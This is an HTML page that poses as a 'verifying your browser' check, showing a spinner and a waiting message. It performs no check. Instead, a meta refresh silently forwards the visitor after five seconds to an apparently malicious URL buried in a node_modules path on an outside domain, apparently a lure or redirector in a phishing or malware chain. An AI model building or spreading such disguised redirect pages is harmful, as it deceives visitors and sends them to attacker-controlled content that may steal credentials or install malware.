<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Verifying Your Browser</title>

  <!-- Redirect after 5 seconds -->
  <meta http-equiv="refresh" content="5;url=https://gunibd.com/node_modules/sass/types/util/9woi83" />

  <style>
    body {
      background-color: #f9f9f9;
      font-family: Arial, sans-serif;
      color: #333;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      text-align: center;
    }
    .spinner {
      margin-top: 30px;
      width: 40px;
      height: 40px;
      border: 4px solid rgba(0, 0, 0, 0.1);
      border-top-color: #3498db;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }

    .message {
      font-size: 18px;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <h1>We are verifying your browser</h1>
  <div class="spinner"></div>
  <div class="message">Please wait while we check your browser...</div>

  <noscript>
    <p><strong>JavaScript is required to proceed.</strong></p>
  </noscript>
</body>
</html>
